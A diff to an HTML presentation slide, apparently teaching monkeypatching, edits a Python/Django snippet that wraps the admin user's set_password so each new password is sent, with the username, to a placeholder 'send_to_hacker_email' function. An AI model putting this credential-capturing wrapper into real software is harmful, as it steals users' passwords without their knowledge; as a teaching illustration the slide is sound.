@@ -126,13 +126,12 @@
 
     <section class="slide">
         <pre>
-            <code>self.real_set_password = self.set_password</code>
-            <code> </code>
             <code>def password_logger(self, newp):</code>
             <code>    send_to_hacker_email(self.username + ":" + newp)</code>
             <code>    self.real_set_password(newp)</code>
             <code> </code>
             <code>user = User.objects.get(username="admin")</code>
+            <code>user.real_set_password = user.set_password</code>
             <code>user.set_password = password_logger</code>
         </pre>
     </section>
